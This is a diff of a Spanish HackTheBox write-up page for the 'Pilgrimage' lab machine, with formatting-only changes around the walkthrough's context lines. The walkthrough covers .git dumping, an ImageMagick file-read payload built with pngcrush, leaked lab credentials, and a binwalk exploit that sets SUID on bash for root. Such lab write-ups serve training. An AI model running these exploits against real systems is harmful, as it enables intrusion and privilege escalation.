@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Pilgrimage Machine - HackTheBox">
-	<meta name="twitter:description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pilgrimage Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
 
 <meta property="og:url" content="https://celero0.github.io/posts/pilgrimage/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="Pilgrimage Machine - HackTheBox">
-	<meta property="og:description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2025-11-29T23:36:29+00:00">
-		<meta property="article:modified_time" content="2025-11-29T23:36:29+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Pilgrimage Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-29T23:36:29+00:00">
+    <meta property="article:modified_time" content="2025-11-29T23:36:29+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -191,7 +191,7 @@
   </a>
 </h1>
 <p><strong>Comando:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.219 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.219 -oG allPorts
 </span></span></code></pre></div><p>En el escaneo vemos el dominio <code>pilgrimage.htb</code></p>
 <img src="/images/Pasted image 20251103181357.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Procederemos a agregarlo a nuestro <code>/etc/hosts</code></p>
@@ -208,7 +208,7 @@
 <p>Nos registraremos con las credenciales <code>rkx:rkx</code> y al loguearnos nos lleva al <code>dashboard.php</code></p>
 <img src="/images/Pasted image 20251103181902.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Revisando la web, no encontramos nada interesante, por tanto seguimos enumerando directorios con <code>fuzz</code> con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://pilgrimage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#a5d6ff">100</span> -fs <span style="color:#a5d6ff">7621</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://pilgrimage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#a5d6ff">100</span> -fs <span style="color:#a5d6ff">7621</span>
 </span></span></code></pre></div><h1 id="enumeración-github">
   Enumeración Github
   <a class="heading-link" href="#enumeraci%c3%b3n-github">
@@ -221,7 +221,7 @@
 <img src="/images/Pasted image 20251103214438.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para enumerar github descargaremos el siguiente recurso de github</p>
 <p><code>https://github.com/arthaud/git-dumper</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/arthaud/git-dumper
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/arthaud/git-dumper
 </span></span></code></pre></div><h2 id="entorno-virtual-en-python">
   Entorno virtual en python
   <a class="heading-link" href="#entorno-virtual-en-python">
@@ -230,13 +230,13 @@
   </a>
 </h2>
 <p>Se crea un entorno virtual para no instalar librerías innecesarias que pueden generar conflictos en nuestro sistema</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m venv .venv
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m venv .venv
 </span></span><span style="display:flex;"><span>source .venv/bin/activate
 </span></span><span style="display:flex;"><span>pip install -r requirements.txt
 </span></span></code></pre></div><p>Usamos git-dumper de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 git_dumper.py http://pilgrimage.htb/.git git
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 git_dumper.py http://pilgrimage.htb/.git git
 </span></span></code></pre></div><p>para salir del entorno virtual usar</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>deactivate
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>deactivate
 </span></span></code></pre></div><p>Haciendo un tree al recurso que descargamos con git-dumper tenemos lo siguiente</p>
 <img src="/images/Pasted image 20251103221052.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Vemos que se está usando <code>magick</code> para hacer la transformación de la imagen, con la bandera <code>-version</code> vemos la versión</p>
@@ -271,11 +271,11 @@
   </a>
 </h2>
 <p>Primeramente descargar un archivo .png cualquiera</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://w7.pngwing.com/pngs/151/483/png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://w7.pngwing.com/pngs/151/483/png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png
 </span></span></code></pre></div><p>Renombramos el archivo por comodidad a <code>gato.png</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png gato.png
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png gato.png
 </span></span></code></pre></div><p>Creamos el archivo <code>pngout.png</code> malicioso</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pngcrush -text a <span style="color:#a5d6ff">&#34;profile&#34;</span> <span style="color:#a5d6ff">&#34;/var/db/pilgrimage&#34;</span> gato.png
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pngcrush -text a <span style="color:#a5d6ff">&#34;profile&#34;</span> <span style="color:#a5d6ff">&#34;/var/db/pilgrimage&#34;</span> gato.png
 </span></span></code></pre></div><h2 id="verificamos-el-archivo-malicioso">
   Verificamos el archivo malicioso
   <a class="heading-link" href="#verificamos-el-archivo-malicioso">
@@ -284,7 +284,7 @@
   </a>
 </h2>
 <p>Para verificar si creamos bien el archivo malicioso usamos</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiv2 -pS pngout.png
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiv2 -pS pngout.png
 </span></span></code></pre></div><p>y tenemos lo siguiente</p>
 <img src="/images/Pasted image 20251103222516.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h2 id="subimos-el-archivo-malicioso-a-la-web">
@@ -305,7 +305,7 @@
   </a>
 </h2>
 <p>Para leer el contenido usamos el siguiente comando, recordar que el output es en hexadecimal</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>identify -verbose 69095618b889b.png
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>identify -verbose 69095618b889b.png
 </span></span></code></pre></div><p>El contenido que nos muestra es bastante largo, ya que es una base de datos</p>
 <img src="/images/Pasted image 20251103222801.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>A nosotros lo que nos interesa es el contenido que está en <code>Raw profile type:</code>, por tanto filtraremos por la primera línea completa de la siguiente forma:</p>
@@ -316,7 +316,7 @@
 <p>y con -A 569 muestra lo siguiente</p>
 <img src="/images/Pasted image 20251103223056.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto utilizaremos -A 569 para tomar todo el contenido</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>identify -verbose 69095618b889b.png | grep -A <span style="color:#a5d6ff">569</span> <span style="color:#a5d6ff">&#34;53514c69&#34;</span> &gt; hex.txt
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>identify -verbose 69095618b889b.png | grep -A <span style="color:#a5d6ff">569</span> <span style="color:#a5d6ff">&#34;53514c69&#34;</span> &gt; hex.txt
 </span></span></code></pre></div><h2 id="transformar-el-contenido">
   Transformar el contenido
   <a class="heading-link" href="#transformar-el-contenido">
@@ -325,7 +325,7 @@
   </a>
 </h2>
 <p>Para transformar desde hexadecimal a texto legible usaremos <code>xxd</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xxd -r -p hex.txt &gt; database.db
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xxd -r -p hex.txt &gt; database.db
 </span></span></code></pre></div><p>Teniendo lo siguiente</p>
 <img src="/images/Pasted image 20251103223349.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="extrayendo-credenciales-desde-database">
@@ -336,7 +336,7 @@
   </a>
 </h1>
 <p>Teniendo la base de datos que obtuvimos gracias a la vulnerabilidad la procedemos a leer con <code>sqlite3</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite3 database.db
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite3 database.db
 </span></span><span style="display:flex;"><span>.tables
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">select</span> * from users;
 </span></span></code></pre></div><p>y obtenemos las siguientes credenciales: <code>emily|abigchonkyboi123</code></p>
@@ -369,7 +369,7 @@
 <p>Una vez descargadas las almacenamos en la carpeta que está analizando binwalk, en este caso <code>/var/www/pilgrimage.htb/shrunk</code></p>
 <img src="/images/Pasted image 20251103231508.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora corremos el script de la siguiente forma:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 walkingpath.py command --command <span style="color:#a5d6ff">&#34;chmod u+s /usr/bin/bash&#34;</span> gato.png
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 walkingpath.py command --command <span style="color:#a5d6ff">&#34;chmod u+s /usr/bin/bash&#34;</span> gato.png
 </span></span></code></pre></div><p>Y lo que hará es dar permiso SUUID a la bash</p>
 <img src="/images/Pasted image 20251103231616.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora con <code>bash -p</code> accedemos a los privilegios de root y podemos leer la flag de <code>root.txt</code></p>
